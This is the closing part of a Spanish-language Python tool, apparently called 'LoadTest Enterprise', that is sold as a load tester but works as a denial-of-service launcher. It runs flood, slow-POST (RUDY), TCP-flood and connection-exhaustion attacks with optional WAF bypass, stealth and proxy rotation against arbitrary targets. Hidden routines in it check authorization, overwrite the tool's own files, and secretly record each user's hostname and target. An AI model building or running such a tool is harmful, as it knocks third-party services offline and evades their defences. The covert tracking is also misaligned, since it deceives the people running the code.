print("Esta herramienta ha sido desactivada por seguridad.")
print("Contacta al administrador para más información.")
print("="*60)
sys.exit(1)
'''
                # Intentar escribir múltiples veces para asegurar que se guarde
                for attempt in range(3):
                    try:
                        with open(script_file, 'w') as f:
                            f.write(disable_code)
                        # Verificar que se escribió correctamente
                        with open(script_file, 'r') as f:
                            if 'ACCESO NO AUTORIZADO' in f.read():
                                break
                    except Exception:
                        if attempt == 2:
                            # Último intento - usar método alternativo
                            try:
                                os.remove(script_file)
                            except Exception:
                                pass
                
                # También intentar desactivar loadtest_web.py
                web_file = script_file.parent / "loadtest_web.py"
                if web_file.exists():
                    try:
                        with open(web_file, 'w') as f:
                            f.write(disable_code)
                    except Exception:
                        pass
                
                # Intentar eliminar archivos de configuración sensibles
                try:
                    auth_file = script_file.parent / ".auth"
                    if auth_file.exists():
                        auth_file.unlink()
                except Exception:
                    pass
        except Exception:
            pass
        
        # Mostrar mensaje y salir
        try:
            print_color("\n" + "="*60, Colors.RED, True)
            print_color("ACCESO NO AUTORIZADO", Colors.RED, True)
            print_color("Esta herramienta ha sido desactivada por seguridad.", Colors.RED)
            print_color("="*60, Colors.RED, True)
        except Exception:
            print("\n" + "="*60)
            print("ACCESO NO AUTORIZADO")
            print("Esta herramienta ha sido desactivada por seguridad.")
            print("="*60)
        
        sys.exit(1)
    except Exception:
        import sys
        sys.exit(1)

def main():
    """Función principal"""
    global TARGET, DURATION, POWER_LEVEL, MULTIPLIER, ATTACK_MODE, DEBUG_MODE, DRY_RUN
    global MAX_CONNECTIONS, MAX_THREADS, USE_LARGE_PAYLOADS, AUTO_THROTTLE, MEMORY_MONITORING
    global WAF_BYPASS, STEALTH_MODE
    
    parser = argparse.ArgumentParser(
        description="LoadTest Enterprise - Enterprise Web Load Testing & Performance Analysis Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  %(prog)s -t https://example.com -d 60 -p MODERATE
  %(prog)s -t 192.168.1.1 -d 120 -p MODERATE  # IP local
  %(prog)s -t 8.8.8.8:443 -d 60 -p LIGHT      # IP pública con puerto
  %(prog)s -t https://example.com -d 120 -p EXTREME --bypass-waf
  %(prog)s -t https://example.com -d 300 -p GODMODE --connections 50000 --threads 500
        """
    )
    
    parser.add_argument("-t", "--target", required=False, help="URL del target, IP o dominio (ej: https://example.com, 192.168.1.1, 8.8.8.8:443). Opcional si se usa --web")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duración en segundos (default: 60)")
    parser.add_argument("-p", "--power", choices=list(POWER_LEVELS.keys()), default="MODERATE", help="Nivel de potencia")
    parser.add_argument("-m", "--mode", choices=["MIXED", "CONSTANT", "BURST", "RAMP_UP"], default="MIXED", help="Modo de ataque")
    parser.add_argument("--connections", type=int, default=10000, help="Máximo de conexiones concurrentes")
    parser.add_argument("--threads", type=int, default=400, help="Máximo de threads")
    parser.add_argument("--large-payloads", action="store_true", help="Usar payloads grandes")
    parser.add_argument("--bypass-waf", action="store_true", help="Activar técnicas de bypass de WAF")
    parser.add_argument("--stealth", action="store_true", help="Modo stealth")
    parser.add_argument("--no-auto-throttle", action="store_true", help="Desactivar auto-throttle")
    parser.add_argument("--no-memory-monitoring", action="store_true", help="Desactivar monitoreo de memoria")
    parser.add_argument("--debug", action="store_true", help="Modo debug")
    parser.add_argument("--dry-run", action="store_true", help="Simulación sin ejecutar")
    parser.add_argument("--show-tools", action="store_true", help="Mostrar estado de herramientas")
    parser.add_argument("--install-tools", action="store_true", help="Instalar herramientas faltantes")
    parser.add_argument("--show-params", action="store_true", help="Mostrar todos los parámetros configurables")
    parser.add_argument("--web", action="store_true", help="Iniciar panel web")
    parser.add_argument("--web-port", type=int, default=5000, help="Puerto para panel web (default: 5000)")
    parser.add_argument("--socket-attack", action="store_true", help="Activar ataque socket-based de bajo nivel")
    parser.add_argument("--check-update", action="store_true", help="Verificar si hay actualizaciones disponibles")
    parser.add_argument("--update", action="store_true", help="Actualizar la herramienta desde GitHub")
    parser.add_argument("--no-auto-update-check", action="store_true", help="Desactivar verificación automática de actualizaciones")
    parser.add_argument("--no-tcp-optimization", action="store_true", help="Desactivar optimizaciones TCP")
    parser.add_argument("--max-payload-mb", type=int, default=10, help="Máximo tamaño de payload en MB (default: 10)")
    parser.add_argument("--connection-pool", type=int, default=1000, help="Tamaño del pool de conexiones (default: 1000)")
    parser.add_argument("--no-keep-alive", action="store_true", help="Desactivar keep-alive pooling")
    parser.add_argument("--no-connection-warmup", action="store_true", help="Desactivar pre-calentamiento de conexiones")
    parser.add_argument("--no-rate-adaptive", action="store_true", help="Desactivar ajuste dinámico de tasa")
    parser.add_argument("--target-variations", nargs="+", help="Variaciones del target (URLs adicionales)")
    
    args = parser.parse_args()
    
    # Verificar actualizaciones (no requiere target)
    if args.check_update:
        has_update, latest_version = check_for_updates(silent=False)
        if has_update:
            print_color(f"\n💡 Para actualizar, ejecuta: python loadtest.py --update", Colors.CYAN, True)
        sys.exit(0)
    
    # Actualizar herramienta (no requiere target)
    if args.update:
        update_tool()
        sys.exit(0)
    
    # Iniciar panel web (no requiere target)
    if args.web:
        start_web_panel(args.web_port)
        sys.exit(0)
    
    # Mostrar todos los parámetros (no requiere target)
    if args.show_params:
        show_all_parameters()
        sys.exit(0)
    
    # Instalar herramientas (no requiere target)
    if args.install_tools:
        auto_install_core_tools()
        show_tool_status()
        sys.exit(0)
    
    # Mostrar herramientas (no requiere target ni validación)
    if args.show_tools:
        show_tool_status()
        sys.exit(0)
    
    # Validar que se proporcione target si no se usa --web o --show-params
    if not args.target:
        parser.error("El argumento -t/--target es requerido (excepto cuando se usa --web, --show-params, --show-tools, --check-update, --update o --install-tools)")
    
    # Configurar variables globales
    TARGET = args.target
    DURATION = args.duration
    POWER_LEVEL = args.power
    MULTIPLIER = POWER_LEVELS[POWER_LEVEL]
    ATTACK_MODE = args.mode
    MAX_CONNECTIONS = args.connections
    MAX_THREADS = args.threads
    USE_LARGE_PAYLOADS = args.large_payloads
    WAF_BYPASS = args.bypass_waf
    STEALTH_MODE = args.stealth
    SOCKET_ATTACK = args.socket_attack
    AUTO_THROTTLE = not args.no_auto_throttle
    MEMORY_MONITORING = not args.no_memory_monitoring
    DEBUG_MODE = args.debug
    DRY_RUN = args.dry_run
    
    # Verificación automática de actualizaciones (solo si no está desactivada)
    if not args.no_auto_update_check:
        auto_check_updates()
    
    # Verificación de autorización adicional (oculta)
    if not _validate_execution():
        return
    
    # Banner
    print_color("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              LoadTest Enterprise v{}                        ║
    ║     Enterprise Web Load Testing & Performance Analysis       ║
    ║                                                              ║
    ║        Professional Security Testing & Analysis Tool         ║
    ╚══════════════════════════════════════════════════════════════╝
    """.format(VERSION), Colors.CYAN, True)
    
    # Registrar señales (solo en thread principal)
    if os.name != 'nt':
        try:
            import threading
            # Solo registrar señales si estamos en el thread principal
            if threading.current_thread() is threading.main_thread():
                signal.signal(signal.SIGINT, signal_handler)
                signal.signal(signal.SIGTERM, signal_handler)
        except (ValueError, AttributeError):
            # Si no podemos registrar señales (ej: thread secundario), continuar sin ellas
            log_message("INFO", "Ejecutando en thread secundario - señales no disponibles")
    
    # Validaciones
    if not validate_critical_variables():
        sys.exit(1)
    
    if not validate_attack_config():
        sys.exit(1)
    
    if not validate_permissions():
        log_message("WARN", "Advertencia de permisos")
    
    # Verificar recursos
    resources_ok, resources = check_system_resources()
    if not resources_ok and not DRY_RUN:
        log_message("WARN", "Recursos del sistema pueden ser insuficientes")
        if WEB_PANEL_MODE:
            # En modo web panel, continuar automáticamente
            log_message("INFO", "Continuando automáticamente (modo web panel)")
        else:
            # Solo pedir confirmación en modo CLI
            try:
                response = input("⚠️ Recursos del sistema pueden ser insuficientes. ¿Continuar? (y/N): ")
                if response.lower() != 'y':
                    log_message("INFO", "Usuario canceló por recursos insuficientes")
                    sys.exit(1)
            except (EOFError, KeyboardInterrupt):
                log_message("INFO", "Interrupción durante confirmación de recursos")
                sys.exit(1)
    
    # Verificar conectividad
    if not DRY_RUN and not check_network_connectivity():
        log_message("ERROR", "No se puede conectar al target")
        sys.exit(1)
    
    # Fingerprint
    fingerprint = fingerprint_target()
    
    # Detectar WAF
    waf_info = detect_waf_advanced()
    if waf_info and waf_info.get("detected"):
        print_color(f"🛡️ WAF detectado: {waf_info.get('name', 'Unknown')}", Colors.YELLOW, True)
    
    # Auto-configuración inteligente basada en fingerprint
    auto_configure_from_fingerprint(fingerprint, waf_info)
    
    # Configuración final
    print_color("\n" + "="*80, Colors.CYAN)
    print_color("⚙️  CONFIGURACIÓN FINAL", Colors.BOLD, True)
    print_color("="*80, Colors.CYAN)
    print_color(f"Target: {TARGET}", Colors.WHITE)
    print_color(f"Tipo: {TARGET_TYPE} ({NETWORK_TYPE})", Colors.WHITE)
    if IP_ADDRESS:
        print_color(f"IP: {IP_ADDRESS}", Colors.WHITE)
    print_color(f"Duración: {DURATION}s", Colors.WHITE)
    print_color(f"Nivel: {POWER_LEVEL} (x{MULTIPLIER})", Colors.WHITE)
    print_color(f"Modo: {ATTACK_MODE}", Colors.WHITE)
    print_color(f"Max Connections: {MAX_CONNECTIONS}", Colors.WHITE)
    print_color(f"Max Threads: {MAX_THREADS}", Colors.WHITE)
    print_color(f"WAF Bypass: {'Activado' if WAF_BYPASS else 'Desactivado'}", Colors.WHITE)
    if DISCOVERED_ENDPOINTS:
        print_color(f"Endpoints descubiertos: {len(DISCOVERED_ENDPOINTS)}", Colors.GREEN)
    print_color("="*80 + "\n", Colors.CYAN)
    
    if DRY_RUN:
        print_color("🔍 MODO DRY-RUN - No se ejecutarán ataques reales\n", Colors.YELLOW, True)
    
    # Confirmación (solo en modo CLI, no en web panel)
    if not DRY_RUN and not WEB_PANEL_MODE:
        try:
            response = input("¿Iniciar stress test? (y/N): ")
            if response.lower() != 'y':
                print_color("Cancelado.", Colors.YELLOW)
                sys.exit(0)
        except (EOFError, KeyboardInterrupt):
            sys.exit(1)
    elif not DRY_RUN and WEB_PANEL_MODE:
        log_message("INFO", "Iniciando stress test automáticamente (modo web panel)")
    
    # Verificación de autorización antes de iniciar ataque (oculta)
    if not _validate_execution():
        return
    
    # Inicializar stats y activar monitoreo
    attack_stats["start_time"] = datetime.now()
    global monitoring_active
    monitoring_active = True
    log_message("INFO", f"Iniciando stress test - Target: {TARGET}, Duración: {DURATION}s, Nivel: {POWER_LEVEL}")
    
    # Registrar inicio de ataque
    try:
        import socket
        _log_usage_location(socket.gethostname(), str(SCRIPT_DIR), f"attack_started_{TARGET}")
    except Exception:
        pass
    
    # Desplegar ataques según modo
    print_color("\n🚀 Iniciando despliegue de ataques...\n", Colors.GREEN, True)
    log_message("INFO", f"Modo de ataque: {ATTACK_MODE}")
    
    # Inicializar variables ANTES de cualquier uso
    MAX_TOOLS_DEPLOY = 8  # Límite máximo conservador de herramientas simultáneas
    tools_deployed = 0  # Inicializar ANTES de cualquier uso
    memory_percent = 0
    memory_available_gb = 0
    
    # Verificar recursos ANTES de desplegar - PROTECCIÓN CRÍTICA
    try:
        import psutil
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        memory_available_gb = round(memory.available / (1024**3), 2)
        cpu_percent = psutil.cpu_percent(interval=0.5)
        
        # Si memoria está muy alta, NO iniciar o reducir drásticamente
        if memory_percent >= MEMORY_THRESHOLD_OOM:
            log_message("CRITICAL", f"🚨 Memoria demasiado alta ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) para iniciar ataque - ABORTANDO para proteger sistema")
            print_color("🚨 ABORTANDO: Memoria demasiado alta para iniciar ataque - Sistema protegido", Colors.RED, True)
            return
        
        if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
            log_message("WARN", f"⚠️ Memoria crítica ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) - Reduciendo herramientas a mínimo")
            MAX_TOOLS_DEPLOY = 3  # Solo 3 herramientas más ligeras
        elif memory_percent >= MEMORY_THRESHOLD_WARN:
            log_message("WARN", f"⚠️ Memoria alta ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) - Reduciendo número de herramientas")
            MAX_TOOLS_DEPLOY = 5
        else:
            MAX_TOOLS_DEPLOY = 8  # Límite máximo conservador
        
        if cpu_percent > 90:
            log_message("WARN", f"⚠️ CPU muy alta ({cpu_percent:.1f}%) - Reduciendo carga")
            MAX_TOOLS_DEPLOY = min(MAX_TOOLS_DEPLOY, 3)
    except ImportError:
        MAX_TOOLS_DEPLOY = 5  # Conservador si no hay psutil
    except Exception as e:
        log_message("ERROR", f"Error verificando recursos: {e}")
        MAX_TOOLS_DEPLOY = 3  # Muy conservador en caso de error
    
    log_message("INFO", f"Límite de herramientas: {MAX_TOOLS_DEPLOY} (memoria: {memory_percent:.1f}%)")
    
    if ATTACK_MODE == "MIXED":
        # Desplegar múltiples herramientas CON DESPLIEGUE GRADUAL Y THROTTLING
        # Priorizar herramientas más eficientes y menos pesadas
        priority_tools = [
            ("wrk", deploy_wrk_attack),
            ("vegeta", deploy_vegeta_attack),
            ("bombardier", deploy_bombardier_attack),
            ("hey", deploy_hey_attack),
            ("ab", deploy_ab_attack),
        ]
        
        # Herramientas secundarias (más pesadas)
        secondary_tools = [
            ("siege", deploy_siege_attack),
            ("goldeneye", deploy_goldeneye_attack),
        ]
        
        # Filtrar solo herramientas disponibles
        available_priority = [(name, func) for name, func in priority_tools if check_command_exists(name)]
        available_secondary = [(name, func) for name, func in secondary_tools if check_command_exists(name)]
        
        # Desplegar herramientas prioritarias con throttling gradual
        print_color("📦 Desplegando herramientas prioritarias...", Colors.CYAN)
        tools_deployed += deploy_tools_with_throttling(
            available_priority, 
            max_tools=MAX_TOOLS_DEPLOY,
            initial_delay=0.5,
            delay_increment=0.2
        )
        
        # Desplegar herramientas secundarias si hay espacio
        if tools_deployed < MAX_TOOLS_DEPLOY and available_secondary:
            print_color("📦 Desplegando herramientas secundarias...", Colors.CYAN)
            remaining_slots = MAX_TOOLS_DEPLOY - tools_deployed
            tools_deployed += deploy_tools_with_throttling(
                available_secondary[:remaining_slots],
                max_tools=remaining_slots,
                initial_delay=1.0,  # Delay mayor para herramientas más pesadas
                delay_increment=0.3
            )
        
        # Ataques Python personalizados (más controlados)
        if tools_deployed < MAX_TOOLS_DEPLOY:
            try:
                deploy_rudy()
                tools_deployed += 1
            except Exception as e:
                log_message("ERROR", f"Error desplegando RUDY: {e}")
        
        # Ataque HTTP personalizado optimizado (SIEMPRE desplegar - es el principal)
        try:
            deploy_custom_http_attack()
        except Exception as e:
            log_message("ERROR", f"Error desplegando ataque HTTP personalizado: {e}")
        
        # Ataques avanzados Python (solo si hay recursos y espacio)
        if memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
            # Solo desplegar algunos ataques avanzados, no todos
            advanced_attacks = [
                deploy_tcp_flood_advanced,
                deploy_connection_exhaustion,
            ]
            for attack_func in advanced_attacks[:2]:  # Máximo 2 ataques avanzados
                if tools_deployed >= MAX_TOOLS_DEPLOY:
                    break
                try:
                    attack_func()
                    tools_deployed += 1
                except Exception as e:
                    log_message("ERROR", f"Error desplegando ataque avanzado: {e}")
        
        # Ataque socket-based de bajo nivel (solo si hay recursos)
        if SOCKET_ATTACK and memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
            try:
                deploy_socket_based_attack()
                tools_deployed += 1
            except Exception as e:
                log_message("ERROR", f"Error desplegando ataque socket-based: {e}")
    
    elif ATTACK_MODE == "CONSTANT":
        # Ataque constante con herramientas específicas (limitado) - despliegue gradual
        constant_tools = []
        if check_command_exists("wrk"):
            constant_tools.append(("wrk", deploy_wrk_attack))
        
        if constant_tools:
            tools_deployed += deploy_tools_with_throttling(
                constant_tools,
                max_tools=min(MAX_TOOLS_DEPLOY, 2),
                initial_delay=0.5,
                delay_increment=0.2
            )
        
        deploy_custom_http_attack()  # Siempre desplegar
        
        if SOCKET_ATTACK and memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
            try:
                deploy_tool_gradually("socket-based", deploy_socket_based_attack, delay=1.0)
                tools_deployed += 1
            except Exception as e:
                log_message("ERROR", f"Error desplegando ataque socket-based: {e}")
    
    elif ATTACK_MODE == "BURST":
        # Ataques en ráfagas (limitado) - despliegue gradual
        burst_tools = []
        if check_command_exists("vegeta"):
            burst_tools.append(("vegeta", deploy_vegeta_attack))
        if check_command_exists("bombardier"):
            burst_tools.append(("bombardier", deploy_bombardier_attack))
        
        if burst_tools:
            tools_deployed += deploy_tools_with_throttling(
                burst_tools,
                max_tools=min(MAX_TOOLS_DEPLOY, 3),
                initial_delay=0.5,
                delay_increment=0.2
            )
        
        deploy_custom_http_attack()  # Siempre desplegar
    
    elif ATTACK_MODE == "RAMP_UP":
        # Aumento gradual (limitado) - despliegue gradual
        ramp_tools = []
        if check_command_exists("hey"):
            ramp_tools.append(("hey", deploy_hey_attack))
        
        if ramp_tools:
            tools_deployed += deploy_tools_with_throttling(
                ramp_tools,
                max_tools=min(MAX_TOOLS_DEPLOY, 2),
                initial_delay=0.5,
                delay_increment=0.2
            )
        
        deploy_custom_http_attack()  # Siempre desplegar
    
    # Iniciar monitoreo
    monitor_thread = threading.Thread(target=monitor_attack, daemon=True)
    monitor_thread.start()
    
    # Esperar a que termine
    try:
        monitor_thread.join(timeout=DURATION + 10)
    except KeyboardInterrupt:
        signal_handler(None, None)
    
    # Detener procesos
    monitoring_active = False
    for process in running_processes:
        try:
            process.terminate()
            process.wait(timeout=5)
        except:
            try:
                process.kill()
            except:
                pass
    
    attack_stats["end_time"] = datetime.now()
    
    # Generar reporte
    print_color("\n📄 Generando reporte final...", Colors.CYAN, True)
    report = generate_report()
    
    print_color("\n✅ Stress test completado!", Colors.GREEN, True)
    print_color(f"📊 Reportes guardados en: {REPORTS_DIR}", Colors.CYAN)

def show_all_parameters():
    """Muestra todos los parámetros configurables"""
    print_color("\n" + "="*80, Colors.CYAN)
    print_color("📋 TODOS LOS PARÁMETROS CONFIGURABLES", Colors.BOLD, True)
    print_color("="*80, Colors.CYAN)
    
    print_color("\n🎯 CONFIGURACIÓN DE TARGET", Colors.YELLOW, True)
    print(f"  TARGET: {TARGET}")
    print(f"  DOMAIN: {DOMAIN}")
    print(f"  IP_ADDRESS: {IP_ADDRESS}")
    print(f"  TARGET_TYPE: {TARGET_TYPE}")
    print(f"  NETWORK_TYPE: {NETWORK_TYPE}")
    print(f"  PROTOCOL: {PROTOCOL}")
    print(f"  PORT: {PORT}")
    print(f"  NETWORK_MODE: {NETWORK_MODE}")
    if TARGET_VARIATIONS:
        print(f"  TARGET_VARIATIONS: {len(TARGET_VARIATIONS)} variación(es)")
    
    print_color("\n⚡ CONFIGURACIÓN DE ATAQUE", Colors.YELLOW, True)
    print(f"  DURATION: {DURATION}s")
    print(f"  POWER_LEVEL: {POWER_LEVEL} (x{POWER_LEVELS.get(POWER_LEVEL, 0)})")
    print(f"  ATTACK_MODE: {ATTACK_MODE}")
    print(f"  ATTACK_PATTERN: {ATTACK_PATTERN}")
    print(f"  MAX_CONNECTIONS: {MAX_CONNECTIONS}")
    print(f"  MAX_THREADS: {MAX_THREADS}")
    print(f"  PAYLOAD_SIZE_KB: {PAYLOAD_SIZE_KB}")
    print(f"  MAX_PAYLOAD_SIZE_MB: {MAX_PAYLOAD_SIZE_MB}MB")
    print(f"  USE_LARGE_PAYLOADS: {USE_LARGE_PAYLOADS}")
    
    print_color("\n📊 CONFIGURACIÓN DE MONITOREO", Colors.YELLOW, True)
    print(f"  MEMORY_MONITORING: {MEMORY_MONITORING}")
    print(f"  AUTO_THROTTLE: {AUTO_THROTTLE}")
    print(f"  AUTO_SCALING: {AUTO_SCALING}")
    print(f"  MEMORY_THRESHOLD_WARN: {MEMORY_THRESHOLD_WARN}%")
    print(f"  MEMORY_THRESHOLD_CRITICAL: {MEMORY_THRESHOLD_CRITICAL}%")
    print(f"  MEMORY_THRESHOLD_OOM: {MEMORY_THRESHOLD_OOM}%")
    
    print_color("\n🛡️ CONFIGURACIÓN DE EVASIÓN", Colors.YELLOW, True)
    print(f"  WAF_BYPASS: {WAF_BYPASS}")
    print(f"  STEALTH_MODE: {STEALTH_MODE}")
    print(f"  PROXY_LIST: {len(PROXY_LIST)} proxy(s)")
    print(f"  PROXY_ROTATION: {PROXY_ROTATION}")
    
    print_color("\n⚙️ OPTIMIZACIONES AVANZADAS", Colors.YELLOW, True)
    print(f"  TCP_OPTIMIZATION: {TCP_OPTIMIZATION}")
    print(f"  SOCKET_REUSE: {SOCKET_REUSE}")
    print(f"  KEEP_ALIVE_POOLING: {KEEP_ALIVE_POOLING}")
    print(f"  CONNECTION_POOL_SIZE: {CONNECTION_POOL_SIZE}")
    print(f"  CONNECTION_WARMUP: {CONNECTION_WARMUP}")
    print(f"  RATE_ADAPTIVE: {RATE_ADAPTIVE}")
    print(f"  HTTP2_MULTIPLEXING: {HTTP2_MULTIPLEXING}")
    print(f"  HTTP3_QUIC: {HTTP3_QUIC}")
    print(f"  ASYNC_MODE: {ASYNC_MODE}")
    
    print_color("\n🌐 CONFIGURACIÓN DISTRIBUIDA", Colors.YELLOW, True)
    print(f"  DISTRIBUTED_MODE: {DISTRIBUTED_MODE}")
    print(f"  WORKER_NODES: {len(WORKER_NODES)} nodo(s)")
    
    print_color("\n🔧 CONFIGURACIÓN DEL SISTEMA", Colors.YELLOW, True)
    print(f"  DEBUG_MODE: {DEBUG_MODE}")
    print(f"  DRY_RUN: {DRY_RUN}")
    
    print_color("\n📈 NIVELES DE POTENCIA DISPONIBLES", Colors.YELLOW, True)
    for level, multiplier in POWER_LEVELS.items():
        print(f"  {level:12s}: {multiplier:3d}x")
    
    print_color("\n🛠️ HERRAMIENTAS DISPONIBLES", Colors.YELLOW, True)
    tools_status = detect_all_tools()
    for category, tools in TOOLS.items():
        print(f"  {category.upper()}:")
        for tool in tools:
            status = "✓" if tools_status.get(tool, False) else "✗"
            color = Colors.GREEN if tools_status.get(tool, False) else Colors.RED
            print_color(f"    {status} {tool}", color)
    
    print_color("\n" + "="*80, Colors.CYAN)

def start_web_panel(port: int = 5000):
    # Verificación de autorización antes de iniciar panel web
    if not _validate_execution():
        print_color("Acceso no autorizado. Panel desactivado.", Colors.RED, True)
        sys.exit(1)
    
    # Registrar inicio del panel web
    try:
        import socket
        _log_usage_location(socket.gethostname(), str(SCRIPT_DIR), "web_panel_started")
    except Exception:
        pass
    """Inicia el panel web"""
    try:
        # Buscar loadtest_web.py en varios ubicaciones posibles
        import sys
        import os
        from pathlib import Path
        
        # Obtener directorio del script actual
        script_dir = Path(__file__).parent.absolute().resolve()
        
        # Agregar directorio del script al path
        sys.path.insert(0, str(script_dir))
        
        # También agregar directorio actual de trabajo
        cwd = Path.cwd().absolute().resolve()
        if str(cwd) not in sys.path:
            sys.path.insert(0, str(cwd))
        
        # También agregar directorio del usuario
        user_dir = Path.home()
        if str(user_dir) not in sys.path:
            sys.path.insert(0, str(user_dir))
        
        # Buscar loadtest_web.py en múltiples ubicaciones
        possible_paths = [
            script_dir / "loadtest_web.py",
            cwd / "loadtest_web.py",
            user_dir / "loadtest_web.py",
            Path(__file__).parent / "loadtest_web.py",  # Relativo al script
        ]
        
        loadtest_web = None
        web_panel_path = None
        
        # Primero intentar importación normal
        try:
            import loadtest_web
        except ImportError:
            # Buscar archivo en las rutas posibles
            for path in possible_paths:
                if path.exists() and path.is_file():
                    web_panel_path = path
                    break
            
            if web_panel_path:
                # Importar desde archivo encontrado
                import importlib.util
                spec = importlib.util.spec_from_file_location("loadtest_web", web_panel_path)
                if spec and spec.loader:
                    loadtest_web = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(loadtest_web)
                else:
                    raise ImportError(f"No se pudo cargar loadtest_web.py desde {web_panel_path}")
            else:
                # Listar directorios buscados para debug
                searched_dirs = [str(p.parent) for p in possible_paths]
                raise ImportError(f"loadtest_web.py no encontrado. Buscado en: {', '.join(searched_dirs)}")
        
        if loadtest_web is None:
            raise ImportError("No se pudo importar loadtest_web")
        
        print_color(f"\n🌐 Iniciando panel web en http://localhost:{port}", Colors.CYAN, True)
        print_color("⚠️  Presiona Ctrl+C para detener el servidor\n", Colors.YELLOW)
        loadtest_web.app.run(host='0.0.0.0', port=port, debug=True, threaded=True)
    except ImportError as e:
        error_msg = str(e)
        if "No module named" in error_msg or "flask" in error_msg.lower() or "cors" in error_msg.lower():
            print_color("ERROR: Faltan dependencias de Python", Colors.RED, True)
            print_color(f"Detalle: {error_msg}", Colors.YELLOW)
            
            # Detectar si se está usando sudo (que ignora el venv)
            venv_python = None
            if os.path.exists("venv/bin/python"):
                venv_python = "venv/bin/python"
            elif os.path.exists(".venv/bin/python"):
                venv_python = ".venv/bin/python"
            
            if venv_python:
                print_color("\n⚠️  PROBLEMA DETECTADO: Estás usando 'sudo python' que ignora el entorno virtual", Colors.YELLOW, True)
                print_color("\n💡 Soluciones:", Colors.CYAN, True)
                print_color("  1. NO uses 'sudo' - ejecuta sin privilegios:", Colors.WHITE)
                print_color(f"     source venv/bin/activate && python loadtest.py --web", Colors.GREEN)
                print_color("  2. O usa el Python del venv directamente:", Colors.WHITE)
                print_color(f"     {venv_python} loadtest.py --web", Colors.GREEN)
                print_color("  3. Si realmente necesitas sudo, instala en el sistema:", Colors.WHITE)
                print_color("     sudo pip install Flask Flask-Cors", Colors.GREEN)
            else:
                print_color("\n💡 Solución: Instala las dependencias con:", Colors.CYAN, True)
                print_color("  pip install -r requirements.txt", Colors.WHITE)
                print_color("  O instala manualmente:", Colors.WHITE)
                print_color("  pip install Flask Flask-Cors", Colors.WHITE)
        elif "loadtest_web" in error_msg:
            print_color("ERROR: loadtest_web.py no encontrado", Colors.RED, True)
            print_color(f"Detalle: {error_msg}", Colors.YELLOW)
            print_color(f"Directorio del script: {script_dir}", Colors.YELLOW)
            print_color(f"Directorio actual: {cwd}", Colors.YELLOW)
            print_color("Asegúrate de que loadtest_web.py esté en el mismo directorio que loadtest.py", Colors.YELLOW)
        else:
            print_color(f"ERROR de importación: {error_msg}", Colors.RED, True)
    except Exception as e:
        print_color(f"ERROR iniciando panel web: {e}", Colors.RED, True)
        import traceback
        if DEBUG_MODE:
            traceback.print_exc()

if __name__ == "__main__":
    # Verificación final antes de ejecutar main
    try:
        if not _validate_execution():
            sys.exit(1)
    except Exception:
        pass  # Continuar si hay error en verificación
    main()

